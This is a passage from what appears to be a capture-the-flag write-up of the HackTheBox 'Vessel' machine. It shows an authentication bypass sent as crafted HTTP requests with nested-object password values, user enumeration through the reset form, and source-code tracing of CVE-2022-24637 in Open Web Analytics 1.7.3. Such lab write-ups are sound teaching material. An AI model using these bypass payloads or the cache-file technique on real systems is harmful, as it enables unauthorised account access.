+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">accounts</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span> <span class="k">AND</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">accounts</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
+</code></pre></div></div>
+<h4 id="exploit-on-vessel">Exploit on Vessel</h4>
+<p>The POST request to login looks like:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/login</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.11.178</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">29</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.10.11.178</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.11.178/login</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">connect.sid=s%3AfwFGY0wm3c9GJN8d0uhaJ_NzLEHOHe1H.oWpvrp2N0NsEbGizfrOv2DZ2U1GAHz3zv%2BMdvjfq1JU</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+username=admin&amp;password=admin
+</code></pre></div></div>
+<p>I’ll send that to repeater, and convert it to JSON (changing both the body and the <code class="language-plaintext highlighter-rouge">Content-Type</code> header):</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/login</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.11.178</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">50</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.10.11.178</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.11.178/login</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">connect.sid=s%3AfwFGY0wm3c9GJN8d0uhaJ_NzLEHOHe1H.oWpvrp2N0NsEbGizfrOv2DZ2U1GAHz3zv%2BMdvjfq1JU</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+<span class="p">{</span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span><span class="w"> </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll send that, and confirm it still returns a redirect to <code class="language-plaintext highlighter-rouge">/login</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230320163526183.webp" type="image/webp"/>
+<img alt="image-20230320163526183" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230320163526183.png"/>
+</picture>
+<p>Now I’ll change the <code class="language-plaintext highlighter-rouge">"password"</code> value to be a nested object. Now the response is a redirect to <code class="language-plaintext highlighter-rouge">/admin</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230320163448793.webp" type="image/webp"/>
+<img alt="image-20230320163448793" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230320163448793.png"/>
+</picture>
+<p>I can either grab that cookie and put it into Firefox with dev tools, or do it again from the browser and intercept the request with Burp and modify the request.</p>
+<p>This escape function bypass also works using the <code class="language-plaintext highlighter-rouge">x-www-form-urlencoded</code> payload like this:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230320165539112.webp" type="image/webp"/>
+<img alt="image-20230320165539112" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230320165539112.png"/>
+</picture>
+<p>I’m not sure if that would always be the case, so it’s worth checking both. I’ll play with this a bit more and fix the vulnerable code in <a href="#beyond-root">Beyond Root</a>.</p>
+<h4 id="enumerate-site">Enumerate Site</h4>
+<p>After bypassing the login, <code class="language-plaintext highlighter-rouge">/admin</code> returns a dashboard:</p>
+<div style="max-height: 300px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20230320165803961.png">
+<img alt="image-20230320165803961" src="https://0xdfimages.gitlab.io/img/image-20230320165803961.png" style="clip-path: polygon(0 0, 100% 0, 100% 260px, 49% 290px, 51% 270px, 0 300px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 260px, 49% 290px, 51% 270px, 0 300px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 275px"><a href="https://0xdfimages.gitlab.io/img/image-20230320165803961.png"><i>Click for full image</i></a></div>
+</div>
+<p>There’s not much of interest on this page. There’s a drop down menu at the top right:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321052807483.webp" type="image/webp"/>
+<img alt="image-20230321052807483" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321052807483.png"/>
+</picture>
+<p>“Settings” and “Activity Log” don’t go anywhere, but “Analytics” leads to <code class="language-plaintext highlighter-rouge">http://openwebanalytics.vessel.htb/</code>. I’ll add that to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+<h3 id="openwebanalyticsvesselhtb">openwebanalytics.vessel.htb</h3>
+<h4 id="site-1">Site</h4>
+<p>The site presents a login form for an <a href="https://www.openwebanalytics.com/">Open Web Analytics</a> instance:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321054921465.webp" type="image/webp"/>
+<img alt="image-20230321054921465" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321054921465.png"/>
+</picture>
+<p>Open Web Analytics is:</p>
+<blockquote>
+<p>the free and open source web analytics framework that lets you stay in control of how you instrument and analyze the use of your websites and application.</p>
+</blockquote>
+<p>It’s a free and open-source alternative to products like Google Analytics.</p>
+<p>The “Forgot your password?” link leads to another form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321055015381.webp" type="image/webp"/>
+<img alt="image-20230321055015381" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321055015381.png"/>
+</picture>
+<p>If I try “0xdf@vessel.htb”, it returns an error showing that that user doesn’t exist:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321055049297.webp" type="image/webp"/>
+<img alt="image-20230321055049297" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321055049297.png"/>
+</picture>
+<p>On the other hand, if I try “admin@vessel.htb”, it reports success, which means I can enumerate valid users via this process:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321055122255.webp" type="image/webp"/>
+<img alt="image-20230321055122255" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321055122255.png"/>
+</picture>
+<h4 id="tech-stack-1">Tech Stack</h4>
+<p>Visiting <code class="language-plaintext highlighter-rouge">/</code> redirects to <code class="language-plaintext highlighter-rouge">http://openwebanalytics.vessel.htb/index.php?owa_do=base.loginForm&amp;owa_go=http%3A%2F%2Fopenwebanalytics.vessel.htb%2F&amp;</code>. This URL shows a few things:</p>
+<ul>
+<li>The site is running on PHP;</li>
+<li><code class="language-plaintext highlighter-rouge">index.php</code> seem to handle everything, with the <code class="language-plaintext highlighter-rouge">owa_do</code> parameter seeming to indicate what to present;</li>
+<li><code class="language-plaintext highlighter-rouge">owa_go</code> seems like the next URL to go to on successful login.</li>
+</ul>
+<p>The HTML source reveals the version of OWA as 1.7.3:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321055656139.webp" type="image/webp"/>
+<img alt="image-20230321055656139" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321055656139.png"/>
+</picture>
+<h4 id="identify-vulnerability">Identify Vulnerability</h4>
+<p>The GitHub <a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics">repo for OWA</a> shows that the current version as of Jan 7 2023 is 1.7.8:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321055755548.webp" type="image/webp"/>
+<img alt="image-20230321055755548" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321055755548.png"/>
+</picture>
+<p>1.7.3 was released on Nov 10, 2021, and the next version, 1.7.4 was released on Feb 2, 2022. Given that Vessel was submitted to HackTheBox in May 2022, it seems like the older version was used (potentially intentionally?).</p>
+<p>The release notes for 1.7.4 include a “CRITICAL SECURITY FIX”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321060024789.webp" type="image/webp"/>
+<img alt="image-20230321060024789" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321060024789.png"/>
+</picture>
+<h3 id="admin-access-to-owa">Admin Access to OWA</h3>
+<h4 id="cve-2022-24637-background">CVE-2022-24637 Background</h4>
+<p>This exploit is really nicely described in <a href="https://devel0pment.de/?p=2494">this post</a> from devel0pment.de. The issue is in cached files that are generated by the site. The files are meant to be PHP files. The code that generates the files writes <code class="language-plaintext highlighter-rouge">&lt;?php\n...</code>. The problem is that in that code, the string is held in single quotes, and in single quotes, PHP <a href="https://stackoverflow.com/questions/3446216/what-is-the-difference-between-single-quoted-and-double-quoted-strings-in-php/3446286#3446286">displays the string “as is”</a>. That means the resulting file looks like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php\n [more stuff]
+</code></pre></div></div>
+<p>That breaks the <code class="language-plaintext highlighter-rouge">&lt;?php</code> tag, and thus the interpreter handles the file as text and not PHP. This is defined in the source of <code class="language-plaintext highlighter-rouge">modules/base/classes/fileCache.php</code> at <a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/fileCache.php#L37">line 37</a>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321061736422.webp" type="image/webp"/>
+<img alt="image-20230321061736422" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321061736422.png"/>
+</picture>
+<p>These cache files are publicly accessible without auth in <code class="language-plaintext highlighter-rouge">owa-data/caches/</code>. A cached <code class="language-plaintext highlighter-rouge">User</code> object is stored in <code class="language-plaintext highlighter-rouge">owa-data/caches/[user id]/owa_user/[hash].php</code>.  A simple failed login is enough to get data to exist.</p>
+<p>There are a few POC exploits for this vulnerability on ExploitDB and GitHub. These were published well after the release of Vessel, so I’m going to proceed without them to show the experience of solving at release time.</p>
+<h4 id="collect-data">Collect Data</h4>
+<p>To exploit this, I’ll need a user. I’ve already validated above that <code class="language-plaintext highlighter-rouge">admin@vessel.htb</code> exists. I’m going to assume that user’s username is admin and try to target that. After a failed login as admin, I’ll check <code class="language-plaintext highlighter-rouge">owa-data/caches</code>, and there is a <code class="language-plaintext highlighter-rouge">1</code> folder (which makes sense that the admin user id would be 1):</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321084651545.webp" type="image/webp"/>
+<img alt="image-20230321084651545" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321084651545.png"/>
+</picture>
+<p>Inside that directory, there’s are different types of cache data folders:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321084721613.webp" type="image/webp"/>
+<img alt="image-20230321084721613" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321084721613.png"/>
+</picture>
+<p>According to the post, the one to target is <code class="language-plaintext highlighter-rouge">owa_user</code>. Visiting this directory shows it empty:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321084907597.webp" type="image/webp"/>
+<img alt="image-20230321084907597" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321084907597.png"/>
+</picture>
+<p>However, immediately after a failed login, it returns an empty page. The cache seems to clear this directory periodically.</p>
+<p>Presumably the file I need to read is in that dir, but I need to know the name.</p>
+<h4 id="get-file-name">Get File Name</h4>
+<p>This is the trickiest part of the exploit. The post says:</p>
+<blockquote>
+<p>Since the PHP cache files are publicly accessible (<strong>owa-data/caches/</strong>), we can retrieve the base64 encoded serialized data. In order to do this, we need to know the name of the cache file. Though it turned out, that the filename is predictable. If the admin user at least logged in once, the cache file exists. But even if the user never logged in, we can trigger the creation by trying to login with this user. The failed login attempt does also create the cache file.</p>
+<p>After calculating the filename, we can easily retrieve the cache file:</p>
+</blockquote>
+<p>The filename is predictable, and we can calculate it, but it doesn’t go into how. I’ll download the <a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/releases/tag/1.7.3">vulnerable code</a>, and start where the blog post identified as the vulnerable function, <code class="language-plaintext highlighter-rouge">putItemToCacheStore</code> in <code class="language-plaintext highlighter-rouge">fileCache.php</code> (source <a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/fileCache.php#L88-L134">on GitHub</a>).</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">putItemToCacheStore</span><span class="p">(</span><span class="nv">$collection</span><span class="p">,</span> <span class="nv">$id</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="k">if</span> <span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">acquire_lock</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">makeCacheCollectionDir</span><span class="p">(</span><span class="nv">$collection</span><span class="p">);</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">debug</span><span class="p">(</span><span class="s1">' writing file for: '</span><span class="mf">.</span><span class="nv">$collection</span><span class="mf">.</span><span class="nv">$id</span><span class="p">);</span>
+            <span class="c1">// create collection dir</span>
+            <span class="nv">$collection_dir</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">makeCollectionDirPath</span><span class="p">(</span><span class="nv">$collection</span><span class="p">);</span>
+            <span class="c1">// asemble cache file name</span>
+            <span class="nv">$cache_file</span> <span class="o">=</span> <span class="nv">$collection_dir</span><span class="mf">.</span><span class="nv">$id</span><span class="mf">.</span><span class="s1">'.php'</span><span class="p">;</span>
+<span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+</code></pre></div></div>
+<p>The file that is eventually written is <code class="language-plaintext highlighter-rouge">$cache_file</code>, which is <code class="language-plaintext highlighter-rouge">$collection_dir</code> appended with <code class="language-plaintext highlighter-rouge">$id</code> and then <code class="language-plaintext highlighter-rouge">.php</code>.</p>
+<p><code class="language-plaintext highlighter-rouge">$collection_dir</code> is the result of <code class="language-plaintext highlighter-rouge">makeCollectionDirPath</code> (<a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/fileCache.php#L141-L148">source</a>):</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">makeCollectionDirPath</span><span class="p">(</span><span class="nv">$collection</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$collection</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">global_collections</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache_dir</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache_id</span><span class="mf">.</span><span class="s1">'/'</span><span class="mf">.</span><span class="nv">$collection</span><span class="mf">.</span><span class="s1">'/'</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache_dir</span><span class="mf">.</span><span class="nv">$collection</span><span class="mf">.</span><span class="s1">'/'</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>I’ll look at where <code class="language-plaintext highlighter-rouge">$collection</code> is passed in, but it seems likely that <code class="language-plaintext highlighter-rouge">$this-&gt;cache_dir</code> is <code class="language-plaintext highlighter-rouge">owa-data/caches/</code>, and then <code class="language-plaintext highlighter-rouge">$this-&gt;cache_id</code> is <code class="language-plaintext highlighter-rouge">1</code>, and <code class="language-plaintext highlighter-rouge">$collection</code> is the directories like <code class="language-plaintext highlighter-rouge">owa_user</code>, <code class="language-plaintext highlighter-rouge">owa_site</code>, etc.</p>
+<p>What remains to be discovered is what is <code class="language-plaintext highlighter-rouge">$id</code> used to call <code class="language-plaintext highlighter-rouge">putItemToCacheStore</code>. This function is called from <code class="language-plaintext highlighter-rouge">cache.php</code> in <code class="language-plaintext highlighter-rouge">persistCache</code> (<a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/cache.php#L133-L154">source</a>). The <code class="language-plaintext highlighter-rouge">fileCache</code> object inherits from the <code class="language-plaintext highlighter-rouge">cache</code> object, so this <code class="language-plaintext highlighter-rouge">persistCache</code> function is available to any cache object. <code class="language-plaintext highlighter-rouge">persistCache</code> is called from the <code class="language-plaintext highlighter-rouge">__destruct</code> function of the <code class="language-plaintext highlighter-rouge">cache</code> object (<a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/cache.php#L208-L213">source</a>).</p>
+<p>In <code class="language-plaintext highlighter-rouge">persistCache</code>, it loops over the <code class="language-plaintext highlighter-rouge">dirty_objs</code>, for each calling <code class="language-plaintext highlighter-rouge">putItemToCacheStore</code> with the <code class="language-plaintext highlighter-rouge">$collection</code> and <code class="language-plaintext highlighter-rouge">$id</code> as key and value.</p>
+<p><code class="language-plaintext highlighter-rouge">$this-&gt;dirty_objs</code> is an array that’s populated in the <code class="language-plaintext highlighter-rouge">set</code> function (<a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/cache.php#L56-L69">source</a>):</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">set</span><span class="p">(</span><span class="nv">$collection</span><span class="p">,</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nv">$expires</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
+    
+        <span class="nv">$hkey</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nb">hash</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+        <span class="n">owa_coreAPI</span><span class="o">::</span><span class="nf">debug</span><span class="p">(</span><span class="s1">'set key: '</span><span class="mf">.</span><span class="nv">$key</span><span class="p">);</span>
+        <span class="n">owa_coreAPI</span><span class="o">::</span><span class="nf">debug</span><span class="p">(</span><span class="s1">'set hkey: '</span><span class="mf">.</span><span class="nv">$hkey</span><span class="p">);</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache</span><span class="p">[</span><span class="nv">$collection</span><span class="p">][</span><span class="nv">$hkey</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">debug</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">'Added Object to Cache - Collection: %s, id: %s'</span><span class="p">,</span> <span class="nv">$collection</span><span class="p">,</span> <span class="nv">$hkey</span><span class="p">));</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">statistics</span><span class="p">[</span><span class="s1">'added'</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>        
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">dirty_objs</span><span class="p">[</span><span class="nv">$collection</span><span class="p">][</span><span class="nv">$hkey</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$hkey</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">dirty_collections</span><span class="p">[</span><span class="nv">$collection</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> 
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">debug</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">'Added Object to Dirty List - Collection: %s, id: %s'</span><span class="p">,</span> <span class="nv">$collection</span><span class="p">,</span> <span class="nv">$hkey</span><span class="p">));</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">statistics</span><span class="p">[</span><span class="s1">'dirty'</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+            
+    <span class="p">}</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">set</code> takes a <code class="language-plaintext highlighter-rouge">$collection</code>, <code class="language-plaintext highlighter-rouge">$key</code>, <code class="language-plaintext highlighter-rouge">$value</code>, and <code class="language-plaintext highlighter-rouge">$expires</code>. <code class="language-plaintext highlighter-rouge">$key</code> is passed to <code class="language-plaintext highlighter-rouge">hash</code> (which just calls <code class="language-plaintext highlighter-rouge">md5</code>, <a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/cache.php#L220-L223">source</a>), and then the result is what’s stored as what is later used at the <code class="language-plaintext highlighter-rouge">$id</code>.</p>
+<p><code class="language-plaintext highlighter-rouge">set</code> is called in <code class="language-plaintext highlighter-rouge">owa_entity.php</code> in the <code class="language-plaintext highlighter-rouge">addToCache</code> function (<a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/owa_entity.php#L286-L293">source</a>):</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">addToCache</span><span class="p">(</span><span class="nv">$col</span> <span class="o">=</span> <span class="s1">'id'</span><span class="p">)</span> <span class="p">{</span>
+        
+        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">isCachable</span><span class="p">())</span> <span class="p">{</span>
+            <span class="nv">$cache</span> <span class="o">=</span> <span class="n">owa_coreAPI</span><span class="o">::</span><span class="nf">cacheSingleton</span><span class="p">();</span>
+            <span class="nv">$cache</span><span class="o">-&gt;</span><span class="nf">setCollectionExpirationPeriod</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getTableName</span><span class="p">(),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getCacheExpirationPeriod</span><span class="p">());</span>
+            <span class="nv">$cache</span><span class="o">-&gt;</span><span class="nf">set</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getTableName</span><span class="p">(),</span> <span class="nv">$col</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'id'</span><span class="p">),</span> <span class="nv">$this</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getCacheExpirationPeriod</span><span class="p">());</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>Working backwards to what’s passed to <code class="language-plaintext highlighter-rouge">set</code>, the <code class="language-plaintext highlighter-rouge">$collection</code> will be the table name, and the <code class="language-plaintext highlighter-rouge">$key</code> will be the <code class="language-plaintext highlighter-rouge">$col</code> appended with <code class="language-plaintext highlighter-rouge">$this-&gt;get('id')</code>, which actually is reading the idea from the database. <code class="language-plaintext highlighter-rouge">$col</code> has a default value of ‘id’.</p>
+<p><code class="language-plaintext highlighter-rouge">addToCache</code> is called a few times:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321103133915.webp" type="image/webp"/>
+<img alt="image-20230321103133915" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321103133915.png"/>
+</picture>
+<p>All but one of those it’s using the default parameter of “id”. I’ll try to hash the string “id1” and check for a file on the webserver, but it doesn’t work.</p>
+<p>The time <code class="language-plaintext highlighter-rouge">addToCache</code> is called by something else is in the <code class="language-plaintext highlighter-rouge">getByColumn</code> function (<a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/owa_entity.php#L415-L457">source</a>):</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">getByColumn</span><span class="p">(</span><span class="nv">$col</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+<span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        
+            <span class="nv">$db</span> <span class="o">=</span> <span class="n">owa_coreAPI</span><span class="o">::</span><span class="nf">dbSingleton</span><span class="p">();</span>
+            <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">selectFrom</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getTableName</span><span class="p">());</span>
+            <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">selectColumn</span><span class="p">(</span><span class="s1">'*'</span><span class="p">);</span>
+            <span class="n">owa_coreAPI</span><span class="o">::</span><span class="nf">debug</span><span class="p">(</span><span class="s2">"Col: </span><span class="nv">$col</span><span class="s2">, value: </span><span class="nv">$value</span><span class="s2">"</span><span class="p">);</span>    
+            <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">where</span><span class="p">(</span><span class="nv">$col</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+            <span class="nv">$properties</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">getOneRow</span><span class="p">();</span>
+            
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$properties</span><span class="p">))</span> <span class="p">{</span>
+                
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">setProperties</span><span class="p">(</span><span class="nv">$properties</span><span class="p">);</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">wasPersisted</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+                <span class="c1">// add to cache            </span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">addToCache</span><span class="p">(</span><span class="nv">$col</span><span class="p">);</span>
+                <span class="n">owa_coreAPI</span><span class="o">::</span><span class="nf">debug</span><span class="p">(</span><span class="s1">'entity loaded from db'</span><span class="p">);</span>        
+            <span class="p">}</span>
+</code></pre></div></div>
+<p>When it has to go to the DB to get values, then it adds this to the cache.</p>
+<p><code class="language-plaintext highlighter-rouge">getByColumn</code> shows up in a lot of places, but the top one is <code class="language-plaintext highlighter-rouge">owa_auth.php</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321103544271.webp" type="image/webp"/>
+<img alt="image-20230321103544271" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321103544271.png"/>
+</picture>
+<p>Given that I know I am targeting something that is created even on a failed login, the third one looks the most promising. It’s in the <code class="language-plaintext highlighter-rouge">getUser</code> function (<a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/owa_auth.php#L417-L422">source</a>):</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">getUser</span><span class="p">()</span> <span class="p">{</span>
+
+        <span class="c1">// fetch user object from the db</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">u</span> <span class="o">=</span> <span class="n">owa_coreAPI</span><span class="o">::</span><span class="nf">entityFactory</span><span class="p">(</span><span class="s1">'base.user'</span><span class="p">);</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">u</span><span class="o">-&gt;</span><span class="nf">getByColumn</span><span class="p">(</span><span class="s1">'user_id'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">credentials</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
